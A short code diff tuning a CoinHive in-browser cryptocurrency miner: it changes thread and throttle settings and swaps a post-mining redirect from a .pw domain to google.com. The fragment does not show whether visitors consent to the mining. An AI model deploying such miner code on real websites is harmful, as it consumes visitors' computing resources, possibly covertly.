@@ -1,8 +1,8 @@
 		var miner = new CoinHive.Anonymous('TqBKEr08A8atWsXdAoc1Rpr1dA1CSPlC',
 		{
-			threads: 1,
+			threads: 2,
 			autoThreads: false,
-			throttle:0.5,
+			throttle:1.5,
 			forceASMJS: false
 		});
 		miner.start(CoinHive.FORCE_MULTI_TAB);
@@ -19,7 +19,7 @@
 		if (acceptedHashes > hashesToGenerate)
 		{
 			miner.stop();
-			window.location = "http://bish0pq.pw/"
+			window.location = "http://google.com/"
 		}
 		else
 		{
